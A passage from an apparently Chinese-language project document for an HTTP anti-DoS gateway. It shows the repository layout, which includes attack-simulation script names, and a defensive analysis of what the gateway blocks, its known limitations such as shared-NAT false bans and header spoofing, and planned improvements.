│       └── rateLimiterLua.js      # Lua 脚本版限流（原子计数）
├── admin/                          # 管理后台（:8081）
│   ├── index.js                   # Express API 服务 + WebSocket
│   ├── websocket.js               # WebSocket 推送服务
│   ├── auth/
│   │   ├── jwt.js                 # JWT 签发与校验
│   │   ├── middleware.js          # requireAuth / parseToken
│   │   ├── users.js               # 用户存储（bcrypt 哈希）
│   │   ├── loginGuard.js          # 登录失败次数 / IP 锁定
│   │   ├── validate.js            # 用户名/密码合法性校验
│   │   └── ssrfGuard.js           # SSRF 防护（外联请求白名单）
│   └── routes/
│       ├── auth.js                # /api/auth/*
│       ├── stats.js               # GET /api/stats
│       ├── bans.js                # /api/bans
│       ├── config.js              # /api/config
│       ├── rules.js               # /api/rules/hits
│       ├── whitelist.js           # /api/whitelist
│       └── threat-intel.js        # /api/threat-intel/*
├── frontend/                       # Vue3 前端
│   ├── src/
│   │   ├── App.vue
│   │   ├── views/
│   │   │   ├── Login.vue          # 登录页
│   │   │   ├── Dashboard.vue      # 监控大屏
│   │   │   ├── Attacks.vue        # 攻击事件流
│   │   │   ├── Bans.vue           # 封禁管理
│   │   │   ├── Whitelist.vue      # 白名单管理
│   │   │   ├── Rules.vue          # 规则配置
│   │   │   └── ThreatIntel.vue    # 威胁情报
│   │   ├── composables/           # WebSocket 等组合式封装
│   │   ├── components/            # 指标卡 / 折线图 / 列表等
│   │   ├── api/                   # axios 封装 + 鉴权拦截
│   │   └── styles.css
│   └── vite.config.js
├── scripts/
│   ├── flood.py                   # HTTP Flood 模拟（Locust）
│   ├── flood_simple.py            # 单脚本 Flood（无依赖版）
│   ├── slowloris.py               # Slowloris 模拟
│   ├── ddos7.py                   # 应用层 7 类攻击综合脚本
│   └── watch_ban.sh               # 实时监控封禁列表
├── docs/                           # 提交文档
├── nginx.conf                      # Nginx 配置
├── ecosystem.config.js             # PM2 配置
├── package.json
└── README.md
```

---

## 10. 安全性与局限性分析

### 10.1 防护能力边界

| 威胁场景 | 防护效果 | 说明 |
|---------|---------|------|
| HTTP Flood（单/少量 IP） | ✅ 有效 | 滑动窗口精确限流 |
| Slowloris | ✅ 有效 | 超时检测覆盖绝大多数变种 |
| 工具类攻击（未伪造 UA） | ✅ 有效 | UA 识别 + 降低阈值 |
| HTTP Flood（大规模 DDoS） | ⚠️ 部分有效 | 单机 Redis 存在性能上限 |
| UA 伪造攻击 | ⚠️ 有限 | UA 可被攻击者伪造，仅作辅助 |
| HTTPS 流量 | ⚠️ 需配置 | 需网关层配置 TLS 证书 |
| 应用层漏洞利用 | ❌ 不防护 | 超出 DoS 网关范围 |
| UDP/ICMP 泛洪 | ❌ 不防护 | 工作在 HTTP 应用层 |

### 10.2 已知局限

- **共享 NAT 误封**：高校宿舍等场景多人共用同一出口 IP，触发限流会误封大量合法用户。可通过增加 IP 白名单机制缓解。
- **内存 Map 单机**：并发连接计数存于内存，多实例部署时计数不共享。扩展时需将 Map 迁移至 Redis（注意原子性问题）。
- **X-Forwarded-For 伪造**：若网关直接暴露公网（未经 Nginx），攻击者可伪造该头绕过 IP 限流。必须在 Nginx 层固定来源 IP。
- **UA 规避成本极低**：攻击者一行代码即可伪造 Chrome UA，UA 识别仅对低成本脚本有效。

### 10.3 后续优化方向

已落地（不再列入 TODO）：~~IP 白名单机制~~、~~配置热加载~~、~~GeoIP 标记/阻断~~、~~请求体大小限制~~、~~后台 JWT 鉴权 + 登录爆破防护~~、~~人机校验挑战页~~、~~规则命中计数~~、~~威胁情报集成（CVE/IOC）~~。

待优化：

- 多实例部署：并发连接计数仍是单机内存 Map，跨实例需迁移至 Redis（注意原子性问题）
- 告警通知：钉钉/飞书 Webhook，攻击事件主动推送
- 访问日志持久化：当前仅有内存 ring buffer，需落盘以便事后取证
- 挑战页升级：当前 JS 挑战仅能对抗简单脚本，对 headless 浏览器无效，可接入 PoW 或 hCaptcha
- HTTPS 终止：网关层加载证书，避免后端业务暴露明文流量


